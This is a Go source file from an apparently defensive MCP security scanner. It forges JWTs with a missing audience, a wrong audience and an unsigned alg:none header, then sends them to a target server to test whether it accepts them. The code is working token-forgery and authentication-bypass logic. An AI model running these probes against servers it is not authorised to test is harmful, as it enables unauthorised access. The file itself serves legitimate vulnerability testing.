package mcp

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/calbebop/batesian/internal/attack"
)

// TokenReplayExecutor tests whether an MCP server validates the `aud` claim on
// incoming OAuth 2.1 bearer tokens (rule mcp-token-replay-001).
//
// Attack sequence:
//  1. Discover OAuth metadata via /.well-known/oauth-authorization-server.
//     If absent, skip gracefully (the server does not use OAuth 2.1).
//  2. Forge three JWTs using stdlib only (no third-party JWT library):
//     - no-aud: HS256 token with no aud claim
//     - wrong-aud: HS256 token with aud pointing to a different server
//     - alg-none: unsigned token (alg:none) whose aud matches the target
//  3. POST each token to {target}/mcp with an MCP initialize request body.
//  4. Emit a finding for any probe that receives HTTP 200.
type TokenReplayExecutor struct {
	rule attack.RuleContext
}

// NewTokenReplayExecutor creates an executor for the mcp-token-replay attack type.
func NewTokenReplayExecutor(r attack.RuleContext) *TokenReplayExecutor {
	return &TokenReplayExecutor{rule: r}
}

// mcpInitBody is the standard MCP initialize request used as the probe body.
const mcpInitBody = `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"batesian","version":"dev"}}}`

// Execute runs the token replay / audience validation test.
func (e *TokenReplayExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	client := attack.NewHTTPClient(opts, vars)

	// Step 1: Discover OAuth metadata. Skip if the server does not use OAuth 2.1.
	metaURL := vars.BaseURL + "/.well-known/oauth-authorization-server"
	metaResp, err := client.GET(ctx, metaURL, nil)
	if err != nil || !metaResp.IsSuccess() {
		return nil, nil
	}

	// Step 2: Forge the three probe tokens.
	noAudToken, err := forgeHS256JWT(map[string]interface{}{
		"iss": "https://attacker.example.com",
		"sub": "batesian-probe",
		"iat": 1700000000,
		"exp": 9999999999,
	})
	if err != nil {
		return nil, fmt.Errorf("forging no-aud token: %w", err)
	}

	wrongAudToken, err := forgeHS256JWT(map[string]interface{}{
		"iss": "https://attacker.example.com",
		"sub": "batesian-probe",
		"aud": "https://wrong-server.example.com",
		"iat": 1700000000,
		"exp": 9999999999,
	})
	if err != nil {
		return nil, fmt.Errorf("forging wrong-aud token: %w", err)
	}

	algNoneToken, err := forgeAlgNoneJWT(map[string]interface{}{
		"iss": "https://attacker.example.com",
		"sub": "batesian-probe",
		"aud": vars.BaseURL,
		"iat": 1700000000,
		"exp": 9999999999,
	})
	if err != nil {
		return nil, fmt.Errorf("forging alg-none token: %w", err)
	}

	type probe struct {
		name      string
		token     string
		severity  string
		titleSufx string
		descSufx  string
	}

	probes := []probe{
		{
			name:      "no-aud",
			token:     noAudToken,
			severity:  "high",
			titleSufx: "accepted JWT with missing aud claim",
			descSufx: "The server accepted a bearer token that carries no `aud` (audience) claim. " +
				"Per RFC 9068, a resource server must reject tokens where the audience is absent " +
				"or does not include the server's own identifier. Tokens issued for any other " +
				"service can be replayed against this server.",
		},
		{
			name:      "wrong-aud",
			token:     wrongAudToken,
			severity:  "high",
			titleSufx: "accepted JWT with wrong aud claim",
			descSufx: "The server accepted a bearer token whose `aud` claim names a completely " +
				"different resource server (https://wrong-server.example.com). This means tokens " +
				"issued for unrelated services can be replayed against this MCP endpoint.",
		},
		{
			name:      "alg-none",
			token:     algNoneToken,
			severity:  "critical",
			titleSufx: "accepted unsigned JWT (alg:none)",
			descSufx: "The server accepted a JWT with `alg:none` and an empty signature. " +
				"This completely bypasses cryptographic token verification: any attacker can " +
				"forge arbitrary claims (including admin roles or elevated scopes) without " +
				"knowing any secret key.",
		},
	}

	// Step 3: Send each probe to each candidate MCP endpoint path.
	// Since the OAuth metadata confirmed this is an OAuth-protected MCP server,
	// we try all standard candidate paths rather than doing an unauthenticated
	// discover probe (which would fail because the endpoint requires a token).
	var findings []attack.Finding
	for _, p := range probes {
		headers := map[string]string{
			"Authorization": "Bearer " + p.token,
			"Content-Type":  "application/json",
		}
		for _, ep := range endpointCandidates(vars.BaseURL) {
			resp, err := client.POST(ctx, ep, headers, json.RawMessage(mcpInitBody))
			if err != nil {
				continue // Network error is not a finding.
			}
			if resp.StatusCode == 200 {
				findings = append(findings, attack.Finding{
					RuleID:      e.rule.ID,
					RuleName:    e.rule.Name,
					Severity:    p.severity,
					Confidence:  attack.ConfirmedExploit,
					Title:       fmt.Sprintf("MCP server %s", p.titleSufx),
					Description: p.descSufx,
					Evidence: fmt.Sprintf(
						"probe: %s\ntoken header.payload: %s...[signature omitted]\nHTTP %d from %s\n%s",
						p.name, jwtHeaderPayload(p.token), resp.StatusCode, ep, snippetMCP(resp.Body),
					),
					Remediation: e.rule.Remediation,
					TargetURL:   ep,
				})
				break // Found a responsive endpoint for this probe; no need to try others.
			}
		}
	}

	return findings, nil
}

// forgeHS256JWT creates a signed JWT using a random HMAC-SHA256 secret.
// All encoding uses stdlib (encoding/base64, encoding/json, crypto/hmac).
func forgeHS256JWT(claims map[string]interface{}) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{"alg": "HS256", "typ": "JWT"})
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}

	h := base64.RawURLEncoding.EncodeToString(headerJSON)
	p := base64.RawURLEncoding.EncodeToString(payloadJSON)
	signingInput := h + "." + p

	secret := make([]byte, 32)
	if _, err := rand.Read(secret); err != nil {
		return "", fmt.Errorf("generating random secret: %w", err)
	}
	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return signingInput + "." + sig, nil
}

// forgeAlgNoneJWT creates a JWT with alg:none and an empty signature segment.
func forgeAlgNoneJWT(claims map[string]interface{}) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{"alg": "none", "typ": "JWT"})
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}

	h := base64.RawURLEncoding.EncodeToString(headerJSON)
	p := base64.RawURLEncoding.EncodeToString(payloadJSON)
	// alg:none requires an empty (but present) signature segment.
	return h + "." + p + ".", nil
}

// jwtHeaderPayload returns the header.payload segments of a JWT without the signature,
// safe for inclusion in evidence output.
func jwtHeaderPayload(token string) string {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) >= 2 {
		return parts[0] + "." + parts[1]
	}
	return "[invalid-token]"
}
